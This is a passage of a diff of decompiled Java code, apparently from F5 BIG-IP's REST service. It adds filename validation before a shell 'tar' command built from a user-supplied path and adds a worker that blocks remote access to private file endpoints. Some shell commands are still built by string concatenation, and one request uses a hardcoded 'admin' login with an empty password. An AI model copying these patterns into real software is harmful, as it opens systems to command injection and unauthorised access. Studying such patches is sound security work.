installFrameworkRpmInBundle(taskState);\r\n         return;\r\n       case INSTALL_APP_RPMS:\r\n         installAppRpmsInBundle(taskState);\r\n         return;\r\n       case UPDATE_USECASE_PACK_VERSION:\r\n         retryCount = 0;\r\n         if (userData != null) {\r\n           retryCount = ((Integer)userData).intValue();\r\n         }\r\n         updateUsecasePackVersion(taskState, retryCount);\r\n         return;\r\n       case DONE:\r\n         taskState.status = TaskItemState.Status.FINISHED;\r\n         sendStatusUpdate(taskState);\r\n         return;\r\n     }\r\n     throw new IllegalStateException(\"Unknown IApp bundle install task step: \" + taskState.step);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   private void validateGzipBundle(final IAppBundleInstallTaskState taskState) {\r\n     if (Utilities.isNullOrEmpty(taskState.filePath)) {\r\n       File agcUseCasePackDir = new File(\"/var/apm/f5-iappslx-agc-usecase-pack/\");\r\n       if (!agcUseCasePackDir.exists() || !agcUseCasePackDir.isDirectory()) {\r\n         String error = \"Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.\";\r\n         failTask(taskState, error, \"\");\r\n         return;\r\n       }\r\n       File[] agcUseCasePack = agcUseCasePackDir.listFiles();\r\n       if (agcUseCasePack == null || agcUseCasePack.length == 0 || !agcUseCasePack[0].isFile()) {\r\n\r\n         String error = \"Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.\";\r\n         failTask(taskState, error, \"\");\r\n         return;\r\n       }\r\n       taskState.filePath = agcUseCasePack[0].getPath();\r\n     }\r\n\r\n+    String filename = taskState.filePath.substring(taskState.filePath.lastIndexOf('/') + 1);\r\n+    Matcher m = validFilePathChars.matcher(filename);\r\n+    if (!m.matches()) {\r\n+      String errorMessage = String.format(\"Access Guided Configuration use case pack validation failed: the file name %s must begin with alphabet, and only contain letters, numbers, spaces and/or special characters (underscore (_), period (.), hyphen (-) and round brackets ()). Only a .tar.gz file is allowed\", new Object[] { filename });\r\n+\r\n+\r\n+\r\n+      failTask(taskState, errorMessage, \"\");\r\n+\r\n+      return;\r\n+    }\r\n     final String extractTarCommand = \"tar -xf \" + taskState.filePath + \" -O > /dev/null\";\r\n\r\n\r\n     ShellExecutor extractTar = new ShellExecutor(extractTarCommand);\r\n\r\n     CompletionHandler<ShellExecutionResult> executionFinishedHandler = new CompletionHandler<ShellExecutionResult>()\r\n       {\r\n         public void completed(ShellExecutionResult extractQueryResult)\r\n         {\r\n           if (extractQueryResult.getExitStatus().intValue() != 0) {\r\n             String error = extractTarCommand + \" failed with exit code=\" + extractQueryResult.getExitStatus();\r\n\r\n\r\n             IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Usecase pack validation failed. Please ensure that usecase pack is a valid tar archive.\", error + \"stdout + stderr=\" + extractQueryResult.getOutput());\r\n\r\n\r\n             return;\r\n           }\r\n\r\n\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.QUERY_INSTALLED_RPM;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, ShellExecutionResult rpmQueryResult) {\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Usecase pack validation failed. Please ensure that usecase pack is a valid tar archive.\", String.format(\"%s failed\", new Object[] { this.val$extractTarCommand }) + RestHelper.throwableStackToString(ex));\r\n         }\r\n       };\r\n\r\n\r\n\r\n     extractTar.startExecution(executionFinishedHandler);\r\n   }\r\n\r\n\r\n   private void queryInstalledRpm(final IAppBundleInstallTaskState taskState) {\r\n     RestRequestCompletion queryCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation) {\r\n           InstalledPackageCollectionState installedPackages = (InstalledPackageCollectionState)operation.getTypedBody(InstalledPackageCollectionState.class);\r\n\r\n\r\n           if (installedPackages != null) {\r\n             taskState.alreadyInstalledRpmsInfo = new ArrayList<>();\r\n             for (InstalledPackageState installedPackage : installedPackages.items) {\r\n               taskState.alreadyInstalledRpmsInfo.add(new IAppBundleInstallTaskState.RpmPackageInfo(installedPackage.appName, installedPackage.version, installedPackage.release, installedPackage.arch, \"\"));\r\n             }\r\n           }\r\n\r\n\r\n\r\n\r\n\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.QUERY_BIGIP_VERSION;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception exception, RestOperation operation) {\r\n           taskState.errorMessage = String.format(\"Failed to query Global Installed Package Worker: %s\", new Object[] { exception.getMessage() });\r\n\r\n\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, taskState.errorMessage, RestHelper.throwableStackToString(exception));\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation queryOperation = RestOperation.create().setCompletion(queryCompletion).setUri(buildLocalUri(new String[] { GlobalInstalledPackageCollectionWorker.WORKER_URI_PATH }));\r\n\r\n\r\n\r\n\r\n     sendGet(queryOperation);\r\n   }\r\n\r\n\r\n\r\n   private void queryBigipVersion(final IAppBundleInstallTaskState taskState) {\r\n     RestRequestCompletion queryCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation) {\r\n           DeviceInfoState infoState = (DeviceInfoState)operation.getTypedBody(DeviceInfoState.class);\r\n           IAppBundleInstallTaskCollectionWorker.this.bigIpVersion = infoState.version;\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.EXTRACT_RPMS_FROM_BUNDLE;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception exception, RestOperation operation) {\r\n           taskState.errorMessage = String.format(\"Failed to query BigIP version from DeviceInfo Worker: %s\", new Object[] { exception.getMessage() });\r\n\r\n\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, taskState.errorMessage, RestHelper.throwableStackToString(exception));\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation queryOperation = RestOperation.create().setCompletion(queryCompletion).setUri(buildLocalUri(new String[] { DeviceInfoWorker.WORKER_URI_PATH }));\r\n\r\n\r\n\r\n\r\n     sendGet(queryOperation);\r\n   }\r\n\r\n\r\n   private void extractRpmsFromBundle(final IAppBundleInstallTaskState taskState) {\r\n     final String extractTarCommand = \"tar -xvf \" + taskState.filePath + \" --directory \" + \"/var/config/rest/downloads/\";\r\n\r\n     ShellExecutor extractTar = new ShellExecutor(extractTarCommand);\r\n\r\n     CompletionHandler<ShellExecutionResult> executionFinishedHandler = new CompletionHandler<ShellExecutionResult>()\r\n       {\r\n         public void completed(ShellExecutionResult extractTarResult)\r\n         {\r\n           if (extractTarResult.getExitStatus().intValue() != 0) {\r\n             String error = extractTarCommand + \" failed with exit code=\" + extractTarResult.getExitStatus();\r\n\r\n\r\n             IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Validate usecase pack by extracting iApps failed\", error + \"stdout + stderr=\" + extractTarResult.getOutput());\r\n\r\n\r\n\r\n             return;\r\n           }\r\n\r\n\r\n           populateRpmsToBeInstalled(taskState, extractTarResult);\r\n\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.READ_MANIFEST_FILE;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n\r\n\r\n         private void populateRpmsToBeInstalled(IAppBundleInstallTaskState taskState, ShellExecutionResult extractTarResult) {\r\n           ArrayList<IAppBundleInstallTaskState.RpmPackageInfo> alreadyInstalledRpms = new ArrayList<>();\r\n           taskState.appRpmsInfo = new ArrayList<>();\r\n\r\n           String[] rpmsToBeInstalled = extractTarResult.getOutput().split(\"\\\\n\");\r\n\r\n\r\n           for (int i = 0; i < rpmsToBeInstalled.length; i++) {\r\n\r\n             if (isManifestFile(rpmsToBeInstalled[i])) {\r\n               taskState.manifestFileName = rpmsToBeInstalled[i];\r\n             }\r\n             else {\r\n\r\n               IAppBundleInstallTaskState.RpmPackageInfo rpmToBeInstalled = getRpmPackageInfo(rpmsToBeInstalled[i]);\r\n\r\n               if (!rpmToBeInstalled.error.equals(\"\")) {\r\n                 updateRpmStatus(taskState, rpmsToBeInstalled[i], IAppBundleInstallTaskState.RpmStatus.ERRORED, rpmToBeInstalled.error);\r\n               }\r\n               else if (isRpmInstallRequired(rpmToBeInstalled)) {\r\n                 updateRpmStatus(taskState, rpmsToBeInstalled[i], IAppBundleInstallTaskState.RpmStatus.EXTRACTED, \"\");\r\n               } else {\r\n\r\n                 alreadyInstalledRpms.add(rpmToBeInstalled);\r\n               }\r\n             }\r\n           }  taskState.alreadyInstalledRpmsInfo = alreadyInstalledRpms;\r\n         }\r\n\r\n         private boolean isManifestFile(String fileName) {\r\n           int index = fileName.lastIndexOf('.');\r\n           if (index != -1 && fileName.substring(index + 1).equals(\"json\"))\r\n           {\r\n             return true;\r\n           }\r\n           return false;\r\n         }\r\n\r\n\r\n\r\n\r\n         private void updateRpmStatus(IAppBundleInstallTaskState taskState, String rpmToBeInstalled, IAppBundleInstallTaskState.RpmStatus rpmStatus, String error) {\r\n           if (rpmToBeInstalled.contains(\"framework\")) {\r\n             taskState.frameworkRpmInfo = new IAppBundleInstallTaskState.RpmInfo(rpmToBeInstalled, rpmStatus, error);\r\n           } else {\r\n\r\n             taskState.appRpmsInfo.add(new IAppBundleInstallTaskState.RpmInfo(rpmToBeInstalled, rpmStatus, error));\r\n           }\r\n         }\r\n\r\n\r\n         private boolean isRpmInstallRequired(IAppBundleInstallTaskState.RpmPackageInfo rpmToBeInstalled) {\r\n           if (taskState.alreadyInstalledRpmsInfo == null || taskState.alreadyInstalledRpmsInfo.isEmpty())\r\n           {\r\n             return true;\r\n           }\r\n           for (IAppBundleInstallTaskState.RpmPackageInfo alreadyInstalledRpm : taskState.alreadyInstalledRpmsInfo) {\r\n             if (alreadyInstalledRpm.name.equals(rpmToBeInstalled.name)) {\r\n               if (VersionUtil.compareVersion(alreadyInstalledRpm.version, rpmToBeInstalled.version) > 0) {\r\n\r\n\r\n                 rpmToBeInstalled.error = createAlreadyInstalledRpmErrorMessage(rpmToBeInstalled, alreadyInstalledRpm);\r\n\r\n                 return false;\r\n               }  if (VersionUtil.compareVersion(alreadyInstalledRpm.version, rpmToBeInstalled.version) == 0)\r\n               {\r\n\r\n                 if (VersionUtil.compareBuild(alreadyInstalledRpm.release, rpmToBeInstalled.release) >= 0) {\r\n\r\n\r\n                   createAlreadyInstalledRpmErrorMessage(rpmToBeInstalled, alreadyInstalledRpm);\r\n\r\n                   return false;\r\n                 }\r\n               }\r\n               break;\r\n             }\r\n           }\r\n           return true;\r\n         }\r\n\r\n\r\n\r\n         private String createAlreadyInstalledRpmErrorMessage(IAppBundleInstallTaskState.RpmPackageInfo rpmToBeInstalled, IAppBundleInstallTaskState.RpmPackageInfo alreadyInstalledRpm) {\r\n           return rpmToBeInstalled.error = \"Installed rpm version is \" + alreadyInstalledRpm.version + \" and release is \" + alreadyInstalledRpm.release;\r\n         }\r\n\r\n\r\n\r\n         private IAppBundleInstallTaskState.RpmPackageInfo getRpmPackageInfo(String rpmFileName) {\r\n           IAppBundleInstallTaskState.RpmPackageInfo rpmPackageInfo = new IAppBundleInstallTaskState.RpmPackageInfo(\"\", \"\", \"\", \"\", \"\");\r\n\r\n\r\n\r\n           int index = rpmFileName.lastIndexOf('.');\r\n           if (index == -1 || !rpmFileName.substring(index + 1).equals(\"rpm\")) {\r\n\r\n             rpmPackageInfo.error = \"Not a rpm file\";\r\n             return rpmPackageInfo;\r\n           }\r\n           rpmFileName = rpmFileName.substring(0, index);\r\n\r\n           index = rpmFileName.lastIndexOf('.'); String subStr;\r\n           if (index == -1 || !(subStr = rpmFileName.substring(index + 1)).equals(\"noarch\")) {\r\n\r\n\r\n             rpmPackageInfo.error = \"Invalid file name format - 'arch' not found in file name\";\r\n             return rpmPackageInfo;\r\n           }\r\n           rpmPackageInfo.arch = subStr;\r\n           rpmFileName = rpmFileName.substring(0, index);\r\n\r\n           index = rpmFileName.lastIndexOf('-');\r\n           if (index == -1 || (subStr = rpmFileName.substring(index + 1)).length() == 0 || !Character.isDigit(subStr.charAt(0))) {\r\n\r\n\r\n             rpmPackageInfo.error = \"Invalid file name format - release not found in file name\";\r\n             return rpmPackageInfo;\r\n           }\r\n           rpmPackageInfo.release = subStr;\r\n           rpmFileName = rpmFileName.substring(0, index);\r\n\r\n           index = rpmFileName.lastIndexOf('-');\r\n           if (index == -1 || (subStr = rpmFileName.substring(index + 1)).length() == 0 || !Character.isDigit(subStr.charAt(0))) {\r\n\r\n\r\n             rpmPackageInfo.error = \"Invalid file name format - version not found in file name\";\r\n             return rpmPackageInfo;\r\n           }\r\n           rpmPackageInfo.version = subStr;\r\n\r\n           rpmPackageInfo.name = rpmFileName.substring(0, index);\r\n           if (rpmPackageInfo.name.length() == 0) {\r\n             rpmPackageInfo.error = \"Invalid file name format - name not found in file name\";\r\n             return rpmPackageInfo;\r\n           }\r\n           return rpmPackageInfo;\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, ShellExecutionResult rpmQueryResult) {\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Extract iApps from usecase pack failed\", String.format(\"%s failed\", new Object[] { this.val$extractTarCommand }) + RestHelper.throwableStackToString(ex));\r\n         }\r\n       };\r\n\r\n\r\n     extractTar.startExecution(executionFinishedHandler);\r\n   }\r\n\r\n\r\n\r\n   private void readManifestFile(final IAppBundleInstallTaskState taskState) {\r\n     if (LangUtil.isNullOrEmpty(taskState.manifestFileName)) {\r\n       failTask(taskState, \"Access Guided Configuration use case pack does not contain manifest file.\", \"\");\r\n\r\n       return;\r\n     }\r\n\r\n     final CompletionHandler<Integer, ByteBuffer> completion = new CompletionHandler<Integer, ByteBuffer>()\r\n       {\r\n         public void completed(Integer result, ByteBuffer bb) {\r\n           InputStream in = new ByteArrayInputStream(bb.array());\r\n           InputStreamReader inr = new InputStreamReader(in);\r\n           taskState.manifest = (IAppBundleInstallTaskState.Manifest)RestOperation.fromJson(inr, IAppBundleInstallTaskState.Manifest.class);\r\n\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.FILTER_RPMS_ON_MIN_BIGIP_VERSION_REQUIRED;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Throwable exc, ByteBuffer attachment) {\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, String.format(\"Failed to read manifest file %s - %s\", new Object[] { this.val$taskState.manifestFileName, exc.getMessage() }), RestHelper.throwableStackToString(exc));\r\n         }\r\n       };\r\n\r\n\r\n\r\n\r\n     StandardOpenOption option = StandardOpenOption.READ;\r\n     Path path = Paths.get(\"/var/config/rest/downloads/\" + taskState.manifestFileName, new String[0]);\r\n     try {\r\n       final AsynchronousFileChannel fileChannel = AsynchronousFileChannel.open(path, new OpenOption[] { option });\r\n\r\n       ByteBuffer buffer = ByteBuffer.allocate((int)fileChannel.size());\r\n\r\n       CompletionHandler<Integer, ByteBuffer> completionHandler = new CompletionHandler<Integer, ByteBuffer>()\r\n         {\r\n\r\n           public void completed(final Integer result, final ByteBuffer attachment)\r\n           {\r\n             RestThreadManager.getBlockingPool().execute(new Runnable()\r\n                 {\r\n                   public void run() {\r\n                     completion.completed(result, attachment);\r\n                     try {\r\n                       fileChannel.close();\r\n                     } catch (IOException e) {\r\n                       IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, String.format(\"Failed to close channel for manifest file %s - %s\", new Object[] { this.this$1.val$taskState.manifestFileName, e.getMessage() }), RestHelper.throwableStackToString(e));\r\n                     }\r\n                   }\r\n                 });\r\n           }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n           public void failed(final Throwable exc, final ByteBuffer attachment) {\r\n             RestThreadManager.getBlockingPool().execute(new Runnable()\r\n                 {\r\n                   public void run() {\r\n                     completion.failed(exc, attachment);\r\n                     try {\r\n                       fileChannel.close();\r\n                     } catch (IOException e) {\r\n                       IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, String.format(\"Failed to close channel for manifest file %s - %s\", new Object[] { this.this$1.val$taskState.manifestFileName, this.val$exc.getMessage() }), RestHelper.throwableStackToString(exc));\r\n                     }\r\n                   }\r\n                 });\r\n           }\r\n         };\r\n\r\n\r\n\r\n\r\n       fileChannel.read(buffer, 0L, buffer, completionHandler);\r\n     } catch (IOException e) {\r\n       failTask(taskState, String.format(\"Failed to read manifest file %s - %s\", new Object[] { taskState.manifestFileName, e.getMessage() }));\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   private void filterRpmsOnMinBigipVersionRequired(IAppBundleInstallTaskState taskState) {\r\n     if (taskState.frameworkRpmInfo != null) {\r\n       checkForMinBigIPVersion(taskState, taskState.frameworkRpmInfo);\r\n     }\r\n     for (IAppBundleInstallTaskState.RpmInfo appRpmInfo : taskState.appRpmsInfo) {\r\n       checkForMinBigIPVersion(taskState, appRpmInfo);\r\n     }\r\n     if (taskState.frameworkRpmInfo != null && taskState.frameworkRpmInfo.status != IAppBundleInstallTaskState.RpmStatus.ERRORED) {\r\n\r\n       taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.INSTALL_FRAMEWORK_RPM;\r\n     } else if (!taskState.appRpmsInfo.isEmpty()) {\r\n       taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.INSTALL_APP_RPMS;\r\n     } else {\r\n       taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.DONE;\r\n     }\r\n     sendStatusUpdate(taskState);\r\n   }\r\n\r\n\r\n   private void checkForMinBigIPVersion(IAppBundleInstallTaskState taskState, IAppBundleInstallTaskState.RpmInfo rpmInfo) {\r\n     for (IAppBundleInstallTaskState.Manifest.Package pkg : taskState.manifest.packages) {\r\n       if (rpmInfo.name.contains(pkg.name)) {\r\n         if (VersionUtil.compareVersion(this.bigIpVersion, pkg.minBigIpVersion) < 0) {\r\n           rpmInfo.error = \"BigIP version (\" + this.bigIpVersion + \") is lower than minimum BigIP version (\" + pkg.minBigIpVersion + \") required for the iApp Rpm.\";\r\n\r\n\r\n           rpmInfo.status = IAppBundleInstallTaskState.RpmStatus.ERRORED;\r\n         }\r\n         break;\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n   private void installFrameworkRpmInBundle(IAppBundleInstallTaskState taskState) {\r\n     IAppBundleInstallTaskState.IAppBundleInstallStep nextStep = IAppBundleInstallTaskState.IAppBundleInstallStep.UPDATE_USECASE_PACK_VERSION;\r\n     if (!taskState.appRpmsInfo.isEmpty()) {\r\n       nextStep = IAppBundleInstallTaskState.IAppBundleInstallStep.INSTALL_APP_RPMS;\r\n     }\r\n     installRpm(taskState.frameworkRpmInfo, taskState, nextStep);\r\n   }\r\n\r\n\r\n\r\n   private void installAppRpmsInBundle(IAppBundleInstallTaskState taskState) {\r\n     IAppBundleInstallTaskState.RpmInfo appRpm;\r\n     do {\r\n       taskState.toBeInstalledAppRpmsIndex++;\r\n       if (taskState.toBeInstalledAppRpmsIndex == taskState.appRpmsInfo.size()) {\r\n\r\n         taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.UPDATE_USECASE_PACK_VERSION;\r\n         sendStatusUpdate(taskState);\r\n         return;\r\n       }\r\n       appRpm = taskState.appRpmsInfo.get(taskState.toBeInstalledAppRpmsIndex);\r\n     }\r\n     while (appRpm.status == IAppBundleInstallTaskState.RpmStatus.ERRORED);\r\n\r\n     installRpm(appRpm, taskState, IAppBundleInstallTaskState.IAppBundleInstallStep.INSTALL_APP_RPMS);\r\n   }\r\n\r\n\r\n\r\n\r\n   private void installRpm(final IAppBundleInstallTaskState.RpmInfo rpmInfo, final IAppBundleInstallTaskState taskState, final IAppBundleInstallTaskState.IAppBundleInstallStep nextStep) {\r\n     rpmInfo.status = IAppBundleInstallTaskState.RpmStatus.INSTALLING;\r\n     IAppPackageManagementTaskState packageMgmt = new IAppPackageManagementTaskState();\r\n     packageMgmt.operation = IAppPackageManagementTaskState.IAppPackageOperation.INSTALL;\r\n     packageMgmt.packageFilePath = \"/var/config/rest/downloads/\" + rpmInfo.name;\r\n\r\n     RestRequestCompletion installCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation) {\r\n           rpmInfo.status = IAppBundleInstallTaskState.RpmStatus.INSTALLED;\r\n           taskState.step = nextStep;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception exception, RestOperation operation) {\r\n           IAppPackageManagementTaskState installResponse = (IAppPackageManagementTaskState)operation.getTypedBody(IAppPackageManagementTaskState.class);\r\n\r\n           String errorMessage = (installResponse != null && installResponse.errorMessage != null) ? installResponse.errorMessage : \"\";\r\n\r\n\r\n\r\n           rpmInfo.status = IAppBundleInstallTaskState.RpmStatus.ERRORED;\r\n           rpmInfo.error = errorMessage;\r\n           taskState.step = nextStep;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n       };\r\n\r\n     RestOperation installOperation = RestOperation.create().setUri(buildLocalUri(new String[] { IAppPackageManagementTaskCollectionWorker.WORKER_URI_PATH })).setBody(packageMgmt).setCompletion((RestRequestCompletion)new TaskCompletion(getServer(), getLogger(), installCompletion));\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n     sendPost(installOperation);\r\n   }\r\n\r\n\r\n\r\n   private void updateUsecasePackVersion(final IAppBundleInstallTaskState taskState, final int retryCount) {\r\n     RestRequestCompletion postCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation) {\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.DONE;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception exception, RestOperation operation) {\r\n           if (retryCount < 5) {\r\n             IAppBundleInstallTaskCollectionWorker.this.scheduleTaskOnce(new Runnable() {\r\n                   public void run() {\r\n                     IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState, Integer.valueOf(retryCount + 1));\r\n                   }\r\n                 }5000 * (1 << retryCount));\r\n           } else {\r\n             taskState.errorMessage = String.format(\"Failed to update usecase pack version: %s\", new Object[] { exception.getMessage() });\r\n\r\n\r\n             IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, taskState.errorMessage, RestHelper.throwableStackToString(exception));\r\n           }\r\n         }\r\n       };\r\n\r\n\r\n     JsonObject body = new JsonObject();\r\n     body.addProperty(\"usecasePackVersion\", taskState.manifest.usecasePackVersion);\r\n\r\n     body.addProperty(\"usecasePackBuild\", getAgcUsecasePackBuild(taskState.filePath));\r\n\r\n     RestOperation postOperation = RestOperation.create().setBody(body).setBasicAuthorization(\"admin\", \"\").setCompletion(postCompletion).setUri(buildLocalUri(new String[] { \"/mgmt/tm/access/usecase-pack-info\" }));\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n     sendPost(postOperation);\r\n   }\r\n\r\n\r\n   private String getAgcUsecasePackBuild(String filePath) {\r\n     int ind = filePath.lastIndexOf('.');\r\n     if (ind != -1) {\r\n       filePath = filePath.substring(0, ind);\r\n     }\r\n\r\n     ind = filePath.lastIndexOf('.');\r\n     if (ind != -1) {\r\n       filePath = filePath.substring(0, ind);\r\n     }\r\n\r\n     ind = filePath.lastIndexOf('-');\r\n     if (ind == -1) {\r\n       getLogger().info(\"Access Guided Configuration use case pack name does not contain build number\");\r\n       return \"\";\r\n     }\r\n     filePath = filePath.substring(ind + 1);\r\n     if (!Character.isDigit(filePath.charAt(0))) {\r\n       getLogger().info(\"Access Guided Configuration use case pack name does not contain build number\");\r\n       return \"\";\r\n     }\r\n     return filePath;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void failTask(IAppBundleInstallTaskState taskState, String errorMessage, String errorDetails) {\r\n     getLogger().severe(errorMessage + \" error details: \" + errorDetails);\r\n     failTask(taskState, errorMessage);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/workers/FileTransferPrivateWorker.java b/com/f5/rest/workers/FileTransferPrivateWorker.java\r\nnew file mode 100644\r\nindex 0000000..50238b7\r\n--- /dev/null\r\n+++ b/com/f5/rest/workers/FileTransferPrivateWorker.java\r\n@@ -0,0 +1,84 @@\r\n+package com.f5.rest.workers;\r\n+\r\n+import com.f5.rest.common.RestLogger;\r\n+import com.f5.rest.common.RestOperation;\r\n+import com.f5.rest.workers.filemanagement.FileManagementHelper;\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+public class FileTransferPrivateWorker\r\n+  extends FileTransferWorker\r\n+{\r\n+  private static final RestLogger LOGGER = new RestLogger(FileTransferPrivateWorker.class, \"\");\r\n+\r\n+\r\n+  public FileTransferPrivateWorker(String postDirectory, String tmpDirectory) throws Exception {\r\n+    super(postDirectory, tmpDirectory);\r\n+  }\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+  public FileTransferPrivateWorker(String getDirectory) throws Exception {\r\n+    super(getDirectory);\r\n+  }\r\n+\r\n+\r\n+  public void onPost(RestOperation post) {\r\n+    if (validateLocalRequest(post)) {\r\n+      failRequest(post);\r\n+      return;\r\n+    }\r\n+    super.onPost(post);\r\n+  }\r\n+\r\n+\r\n+  protected void onDelete(RestOperation delete) {\r\n+    if (validateLocalRequest(delete)) {\r\n+      failRequest(delete);\r\n+      return;\r\n+    }\r\n+    super.onDelete(delete);\r\n+  }\r\n+\r\n+\r\n+  public void onGet(RestOperation get) {\r\n+    if (validateLocalRequest(get)) {\r\n+      failRequest(get);\r\n+      return;\r\n+    }\r\n+    super.onGet(get);\r\n+  }\r\n+\r\n+\r\n+  protected void onQuery(RestOperation request) {\r\n+    if (validateLocalRequest(request)) {\r\n+      failRequest(request);\r\n+      return;\r\n+    }\r\n+    super.onQuery(request);\r\n+  }\r\n+\r\n+  private boolean validateLocalRequest(RestOperation request) {\r\n+    return request.getReferer().equals(request.getRemoteSender());\r\n+  }\r\n+\r\n+  private void failRequest(RestOperation post) {\r\n+    FileManagementHelper.cleanPostForResponse(post);\r\n+    post.setStatusCode(404);\r\n+    post.fail(new IllegalAccessException(\"Private endpoints are not supported from remote\"));\r\n+  }\r\n+}\r\ndiff --git a/com/f5/rest/workers/RolesWorker.java b/com/f5/rest/workers/RolesWorker.java\r\nindex 244f6d5..2ef8e3b 100644\r\n--- a/com/f5/rest/workers/RolesWorker.java\r\n+++ b/com/f5/rest/workers/RolesWorker.java\r\n@@ -1,1375 +1,1371 @@\r\n package com.f5.rest.workers;\r\n\r\n import com.f5.rest.common.CompletionHandler;\r\n import com.f5.rest.common.RestCollectionMergeResult;\r\n import com.f5.rest.common.RestCollectionWorker;\r\n import com.f5.rest.common.RestHelper;\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestReference;\r\n import com.f5.rest.common.RestRequestCompletion;\r\n import com.f5.rest.common.RestServer;\r\n import com.f5.rest.common.RestWorker;\r\n import com.f5.rest.common.SubscriptionWorker;\r\n import com.f5.rest.common.UrlHelper;\r\n import com.f5.rest.common.WellKnownPorts;\r\n import com.f5.rest.workers.authn.AuthnWorker;\r\n import com.f5.rest.workers.authz.AuthzHelper;\r\n import com.f5.rest.workers.authz.EffectivePermissionsWorker;\r\n import com.f5.rest.workers.gossip.RemoteStateCopier;\r\n import java.net.URI;\r\n import java.util.HashSet;\r\n import java.util.Iterator;\r\n import java.util.Map;\r\n import java.util.Set;\r\n import java.util.TimerTask;\r\n import java.util.concurrent.ConcurrentHashMap;\r\n import java.util.concurrent.ConcurrentLinkedQueue;\r\n import java.util.concurrent.atomic.AtomicBoolean;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n public class RolesWorker\r\n   extends RestCollectionWorker<RolesWorkerState, RolesCollectionState>\r\n   implements EvaluatePermissions.Evaluate\r\n {\r\n   public static final String WORKER_URI_PATH = WellKnownPorts.AUTHZ_ROLES_WORKER_URI_PATH;\r\n\r\n   private static final String EXTERNAL_ROLES_WORKER_URI_PATH = UrlHelper.normalizeUriPath(UrlHelper.makePublicPath(WellKnownPorts.AUTHZ_ROLES_WORKER_URI_PATH));\r\n\r\n   private static final String EXTERNAL_RESOURCE_GROUPS_WORKER_URI_PATH = UrlHelper.normalizeUriPath(UrlHelper.makePublicPath(WellKnownPorts.AUTHZ_RESOURCE_GROUPS_WORKER_URI_PATH));\r\n\r\n   private static final String EXTERNAL_LOGIN_WORKER_PATH = UrlHelper.normalizeUriPath(UrlHelper.makePublicPath(AuthnWorker.WORKER_URI_PATH));\r\n\r\n   private static final String EXTERNAL_EFFECTIVE_PERMISSIONS_WORKER_PATH = UrlHelper.normalizeUriPath(UrlHelper.makePublicPath(WellKnownPorts.AUTHZ_EFFECTIVE_PERMISSIONS_WORKER_URI_PATH));\r\n\r\n   public static final String ADMIN_ROLE = \"Administrator\";\r\n\r\n   public static final String ADMIN_ROLE_DESCRIPTION = \"Administrators are able to perform any action.\";\r\n   public static final String READ_ONLY_MSG_FMT = \"Cannot %s built in roles.\";\r\n   private static final String LOCAL_USERS_PATH = UrlHelper.makePublicPath(WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH);\r\n\r\n\r\n   private final Map<String, RoleResourceMatcher> roleNameToResources = new ConcurrentHashMap<>();\r\n   private final Map<RestReference, Set<String>> resourceGroupToRoleNames = new ConcurrentHashMap<>();\r\n   private final Map<RestReference, Set<String>> userLinkToRoleNames = new 